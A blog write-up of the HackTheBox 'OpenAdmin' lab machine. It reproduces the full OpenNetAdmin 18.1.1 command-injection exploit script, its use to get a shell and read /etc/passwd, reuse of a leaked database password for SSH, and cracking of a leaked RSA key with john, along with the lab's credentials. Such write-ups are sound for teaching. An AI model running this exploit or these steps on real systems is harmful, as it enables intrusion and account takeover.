---
layout: post
title: HackTheBox - OpenAdmin
---

## Enumeration
```
$ nmap -sV 10.10.10.171 --script=vuln
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 21:12 EST
Nmap scan report for 10.10.10.171
Host is up (1.4s latency).
Not shown: 979 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     tcpwrapped
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open     tcpwrapped
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
106/tcp   filtered pop3pw
1067/tcp  filtered instl_boots
1149/tcp  filtered bvtsonar
1151/tcp  filtered unizensus
1761/tcp  filtered landesk-rc
2007/tcp  filtered dectalk
2394/tcp  filtered ms-olap2
3221/tcp  filtered xnm-clear-text
4005/tcp  filtered pxc-pin
4125/tcp  filtered rww
5214/tcp  filtered unknown
6156/tcp  filtered unknown
8333/tcp  filtered bitcoin
9040/tcp  filtered tor-trans
9876/tcp  filtered sd
10629/tcp filtered unknown
14441/tcp filtered unknown
15742/tcp filtered unknown
19350/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.80 seconds
```

Navigating to 10.10.10.171:80, we get a default Apache2 Ubuntu page.

Run dirbuster on 10.10.10.171 with the medium size wordlist. 

![dirbuster.png](/images/openadmin/dirbuster.png)

I tried /artwork and /music, but /ona is interesting. 

![ONA](/images/openadmin/ona.png)

The server is using OpenNetAdmin v18.1.1, so let's check for vulns.

```
root@kali:~# searchsploit OpenNetAdmin
------------------------------------------------------- ----------------------------------------
 Exploit Title                                         |  Path
                                                       | (/usr/share/exploitdb/)
------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution          | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metas | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution            | exploits/php/webapps/47691.sh
------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

## Exploitation

Let's check the RCE bash script: /usr/share/exploitdb/exploits/php/webapps/47691.sh

```
[...]
# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Looks good to me! If you would like to learn more about how this exploit actually works, check my [Exploit Analysis post](https://zacheller.dev/open-net-admin).

```bash
root@kali:~/HackTheBox/OpenAdmin$ cp /usr/share/exploitdb/exploits/php/webapps/47691.sh ~/HackTheBox/OpenAdmin/
root@kali:~/HackTheBox/OpenAdmin$ ./47691.sh
/usr/share/exploitdb/exploits/php/webapps/47691.sh: line 8: $'\r': command not found
/usr/share/exploitdb/exploits/php/webapps/47691.sh: line 16: $'\r': command not found
/usr/share/exploitdb/exploits/php/webapps/47691.sh: line 18: $'\r': command not found
/usr/share/exploitdb/exploits/php/webapps/47691.sh: line 23: syntax error near unexpected token `done'
/usr/share/exploitdb/exploits/php/webapps/47691.sh: line 23: `done'
```
The carraige returns ('\r') tell me that this shell script is in a DOS format. Let's use dos2unix on the file.
```bash
root@kali:~/HackTheBox/OpenAdmin$ dos2unix 47691.sh 
dos2unix: converting file 47691.sh to Unix format...
```

Let's get exploiting.

## Gaining Access

```
root@kali:~/HackTheBox/OpenAdmin$ ./47691.sh 10.10.10.171/ona/
$ pwd
/opt/ona/www
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ whoami
www-data
```

Alright, we're in! Now, whose box is this?

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

Hi jimmy and joanna. Seems like the server runs mysql too.

## Excalating Privileges

We're off to get the flags and escalate privileges. Let's start by searching for config files that may leak credentials.

```
$ file config
config: directory
$ cd config
$ ls config
auth_ldap.config.php
config.inc.php
```
We don't have permission to ```cd``` into the config directory, but we can see what is inside.

```bash
$ cat config/config.inc.php 
```
```php
<?php

///////////////////////   WARNING   /////////////////////////////
//           This is the site configuration file.              //
//                                                             //
//      It is not intended that this file be edited.  Any      //
//      user configurations should be in the local config or   //
//      in the database table sys_config                       //
//                                                             //
/////////////////////////////////////////////////////////////////

// Used in PHP for include files and such
// Prefix.. each .php file should have already set $base and $include
// if it is written correctly.  We assume that is the case.
$base;
$include;

$onabase = dirname($base);


//$baseURL = preg_replace('+' . dirname($_SERVER['DOCUMENT_ROOT']) . '+', '', $base);
//$baseURL = preg_replace('+/$+', '', $baseURL);

// Used in URL links
$baseURL=dirname($_SERVER['SCRIPT_NAME']); $baseURL = rtrim($baseURL, '/');
$images = "{$baseURL}/images";

// help URL location
$_ENV['help_url'] = "http://opennetadmin.com/docs/";


// Get any query info
parse_str($_SERVER['QUERY_STRING']);



// Many of these settings serve as defaults.  They can be overridden by the settings in
// the table "sys_config"
$conf = array (
    /* General Setup */
    // Database Context
    // For possible values see the $ona_contexts() array  in the database_settings.inc.php file
    "default_context"        => 'DEFAULT',

    /* Used in header.php */
    "title"                  => 'OpenNetAdmin :: ',
    "meta_description"       => '',
    "meta_keywords"          => '',
    "html_headers"           => '',

    /* Include Files: HTML */
    "html_style_sheet"       => "$include/html_style_sheet.inc.php",
    "html_desktop"           => "$include/html_desktop.inc.php",
    "loading_icon"           => "<br><center><img src=\"{$images}/loading.gif\"></center><br>",

    /* Include Files: Functions */
    "inc_functions"          => "$include/functions_general.inc.php",
    "inc_functions_gui"      => "$include/functions_gui.inc.php",
    "inc_functions_db"       => "$include/functions_db.inc.php",
    "inc_functions_auth"     => "$include/functions_auth.inc.php",
    "inc_db_sessions"        => "$include/adodb_sessions.inc.php",
    "inc_adodb"              => "$include/adodb/adodb.inc.php",
    "inc_adodb_xml"          => "$include/adodb/adodb-xmlschema03.inc.php",
    "inc_xajax_stuff"        => "$include/xajax_setup.inc.php",
    "inc_diff"               => "$include/DifferenceEngine.php",

    /* Settings for dcm.pl */
    "dcm_module_dir"         => "$base/modules",
    "plugin_dir"             => "$base/local/plugins",

    /* Defaults for some user definable options normally in sys_config table */
    "debug"                  => "2",
    "syslog"                 => "0",
    "stdout"                 => "0",
    "log_to_db"              => "0",
    "logfile"                => "/var/log/ona.log",

    /* The output charset to be used in htmlentities() and htmlspecialchars() filtering */
    "charset"                => "utf8",
    "php_charset"            => "UTF-8",

    // enable the setting of the database character set using the "set name 'charset'" SQL command
    // This should work for mysql and postgres but may not work for Oracle.
    // it will be set to the value in 'charset' above.
    "set_db_charset"         => TRUE,
);


// Read in the version file to our conf variable
// It must have a v<majornum>.<minornum>, no number padding, to match the check version code.
if (file_exists($base.'/../VERSION')) { $conf['version'] = trim(file_get_contents($base.'/../VERSION')); }

// The $self array is used to store globally available temporary data.
// Think of it as a cache or an easy way to pass data around ;)
// I've tried to define the entries that are commonly used:
$self = array (
    // Error messages will often get stored in here
    "error"                  => "",

    // All sorts of things get cached in here to speed things up
    "cache"                  => array(),

    // Get's automatically set to 1 if we're using HTTPS/SSL
    "secure"                 => 0,
);
// If the server port is 443 then this is a secure page
// This is basically used to put a padlock icon on secure pages.
if ($_SERVER['SERVER_PORT'] == 443) { $self['secure'] = 1; }




///////////////////////////////////////////////////////////////////////////////
//                            STYLE SHEET STUFF                              //
///////////////////////////////////////////////////////////////////////////////


// Colors
$color['bg']                   = '#FFFFFF';
$color['content_bg']           = '#FFFFFF';
$color['bar_bg']               = '#D3DBFF';
$color['border']               = '#555555'; //#1A1A1A
$color['form_bg']              = '#FFEFB6';

$color['font_default']         = '#000000';
$color['font_title']           = '#4E4E4E';
$color['font_subtitle']        = '#5A5A5A';
$color['font_error']           = '#E35D5D';

$color['link']                 = '#6B7DD1';
$color['vlink']                = '#6B7DD1';
$color['alink']                = '#6B7DD1';
$color['link_nav']             = '#0048FF';  // was '#7E8CD7';
$color['link_act']             = '#FF8000';  // was '#EB8F1F';
$color['link_domain']          = 'green';    // was '#5BA65B';

$color['button_normal']        = '#FFFFFF';
$color['button_hover']         = '#E0E0E0';

// Define some colors for the subnet map:
$color['bgcolor_map_host']     = '#BFD2FF';
$color['bgcolor_map_subnet']   = '#CCBFFF';
$color['bgcolor_map_selected'] = '#FBFFB6';
$color['bgcolor_map_empty']    = '#FFFFFF';

// Much of this configuration is required here since
// a lot of it's used in xajax calls before a web page is created.
$color['menu_bar_bg']          = '#F3F1FF';
$color['menu_header_bg']       = '#FFFFFF';
$color['menu_item_bg']         = '#F3F1FF';
$color['menu_header_text']     = '#436976';
$color['menu_item_text']       = '#436976';
$color['menu_item_selected_bg']= '#B1C6E3';
$color['menu_header_bg']       = '#B1C6E3';


// Style variables (used in PHP in various places)
$style['font-family'] = "Arial, Sans-Serif";
$style['borderT'] = "border-top: 1px solid {$color['border']};";
$style['borderB'] = "border-bottom: 1px solid {$color['border']};";
$style['borderL'] = "border-left: 1px solid {$color['border']};";
$style['borderR'] = "border-right: 1px solid {$color['border']};";

// Include the localized configuration settings
// MP: this may not be needed now that "user" configs are in the database
@include("{$base}/local/config/config.inc.php");

// Include the basic system functions
// any $conf settings used in this "require" should not be user adjusted in the sys_config table
require_once($conf['inc_functions']);

// Include the basic database functions
require_once($conf['inc_functions_db']);

// Include the localized Database settings
$dbconffile = "{$base}/local/config/database_settings.inc.php";
if (file_exists($dbconffile)) {
    if (substr(exec("php -l $dbconffile"), 0, 28) == "No syntax errors detected in") {
        @include($dbconffile);
    } else {
        echo "Syntax error in your DB config file: {$dbconffile}<br>Please check that it contains a valid PHP formatted array, or check that you have the php cli tools installed.<br>You can perform this check maually using the command 'php -l {$dbconffile}'.";
        exit;
    }
} else {
    require_once($base.'/../install/install.php');
    exit;
}

// Check to see if the run_install file exists.
// If it does, run the install process.
if (file_exists($base.'/local/config/run_install') or @$runinstaller or @$install_submit == 'Y') {
    // Process the install script
    require_once($base.'/../install/install.php');
    exit;
}

// Set multibyte encoding to UTF-8
if (@function_exists('mb_internal_encoding')) {
    mb_internal_encoding("UTF-8");
} else {
    printmsg("INFO => Missing 'mb_internal_encoding' function. Please install PHP 'mbstring' functions for proper UTF-8 encoding.", 0);
}

// If we dont have a ona_context set in the cookie, lets set a cookie with the default context
if (!isset($_COOKIE['ona_context_name'])) { $_COOKIE['ona_context_name'] = $conf['default_context']; setcookie("ona_context_name", $conf['default_context']); }

// (Re)Connect to the DB now.
global $onadb;
$onadb = db_pconnect('', $_COOKIE['ona_context_name']);

// Load the actual user config from the database table sys_config
// These will override any of the defaults set above
list($status, $rows, $records) = db_get_records($onadb, 'sys_config', 'name like "%"', 'name');
foreach ($records as $record) {
    printmsg("INFO => Loaded config item from database: {$record['name']}=''{$record['value']}''",5);
    $conf[$record['name']] = $record['value'];
}

// Include functions that replace the default session handler with one that uses MySQL as a backend
require_once($conf['inc_db_sessions']);

// Include the GUI functions
require_once($conf['inc_functions_gui']);

// Include the AUTH functions
require_once($conf['inc_functions_auth']);

// Start the session handler (this calls a function defined in functions_general)
startSession();

// Set session inactivity threshold
ini_set("session.gc_maxlifetime", $conf['cookie_life']);

// if search_results_per_page is in the session, set the $conf variable to it.  this fixes the /rows command
if (isset($_SESSION['search_results_per_page'])) $conf['search_results_per_page'] = $_SESSION['search_results_per_page'];

// Set up our page to https if requested for our URL links
if (@($conf['force_https'] == 1) or ($_SERVER['SERVER_PORT'] == 443)) {
    $https  = "https://{$_SERVER['SERVER_NAME']}";
}
else {
    if ($_SERVER['SERVER_PORT'] != 80) {
      $https  = "http://{$_SERVER['SERVER_NAME']}:{$_SERVER['SERVER_PORT']}";
    } else {
      $https  = "http://{$_SERVER['SERVER_NAME']}";
    }
}

// DON'T put whitespace at the beginning or end of included files!!!
?>
```
This part of the above file looks interesting, maybe some database credentials?

```php
// Include the basic database functions
require_once($conf['inc_functions_db']);

// Include the localized Database settings
$dbconffile = "{$base}/local/config/database_settings.inc.php";
```

With ```{$base}``` being ```/opt/ona/www```:

```shell
$ cat /opt/ona/www/local/config/database_settings.inc.php
```

```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

```
Awesome, we got credentials.

|Login:|	ona_sys
|Password:| 	n1nj4W4rri0R!

Let's see if jimmy or joanna use this password.

```shell
$ ssh jimmy@10.10.10.171
jimmy@openadmin:~$
```

jimmy does and joanna doesn't--good to know. Since we are here, let's try to find the user flag before escalating privileges again. As www-data, we were in a restricted shell. Now, we can start poking around. Though, it turns out we can't go back to the ```ona``` directory.

```shell
jimmy@openadmin:/var/www$ cd ona
-bash: cd: ona: Permission denied
```
In ```/var/www/internal```, we see an index.php file that checks if a POSTed username is jimmy and then uses a sha512 hash against the input password to see if it matches against a stored hash.

```php
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```

Just in case, I decided to run the PHP and it turns out ```n1nj4W4rri0R!``` does not match the hash.

```bash
$ php -r 'echo hash("sha512", "n1nj4W4rri0R!");'
f0bb26b5b49e3314acc8a2ce6d0a62357a090790b4aed5b592a142746b144dbb92960cfbdbb4386928c6633f672b455120cbf939134f34d02ecea63ee4630344
```

Well, good on jimmy for not using the same password. Before we start trying to crack the web login with hydra, let's look around some more.

```shell
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Let's see if we can access joanna's id_rsa file by curling the page on the live site.

```shell
jimmy@openadmin:~$ curl http://localhost/main.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
```

Let's check what ports the server is listening on to cut out some of the noise from our original ```nmap``` enumeration.

```shell
jimmy@openadmin:~$ netstat -tuln # {-t|--tcp} {-u|--udp}, {-l|--listening}, {-n|--numeric}
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                      
```

Let's try some ports.

```shell
jimmy@openadmin:~$ curl http://localhost:53/main.php
curl: (7) Failed to connect to localhost port 53: Connection refused
jimmy@openadmin:~$ curl http://localhost:3306/main.php
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
jimmy@openadmin:~$ curl http://localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Watch out joanna!

```shell
root@kali:~/HackTheBox/OpenAdmin$ echo "-----BEGIN RSA PRIVATE KEY-----
> Proc-Type: 4,ENCRYPTED
> DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
> 
> kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
> ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
> ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
> 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
> ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
> y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
> 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
> piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
> /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
> 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
> fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
> 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
> X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
> S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
> FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
> Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
> RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
> uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
> 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
> XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
> yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
> +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
> qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
> z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
> K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
> -----END RSA PRIVATE KEY-----" > joanna_rsa
```

If we just try to use joanna_rsa as our identity file in an ssh command, we are asked for a password. We are also told the permissions are too open.

Let's find the password!

```shell
root@kali:~/HackTheBox/OpenAdmin$ python /usr/share/john/ssh2john.py 
Usage: /usr/share/john/ssh2john.py <RSA/DSA/EC/OpenSSH private key file(s)>

root@kali:~/HackTheBox/OpenAdmin$ python /usr/share/john/ssh2john.py joanna_rsa | tee joanna.hash
joanna_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d

root@kali:~/HackTheBox/OpenAdmin$ john joanna.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_rsa)
1g 0:00:00:05 DONE (2020-03-11 18:15) 0.1919g/s 2752Kp/s 2752Kc/s 2752KC/s *7¡Vamos!
Session completed
```

Now let's adjust our permissions and log in.

```shell
root@kali:~/HackTheBox/OpenAdmin$ chmod 600 joanna_rsa 
root@kali:~/HackTheBox/OpenAdmin$ ssh joanna@10.10.10.171 -i joanna_rsa 
Enter passphrase for key 'joanna_rsa': # bloodninjas
...
joanna@openadmin:~$
```

---

### Getting the User Flag

![own user](/images/openadmin/user.png)
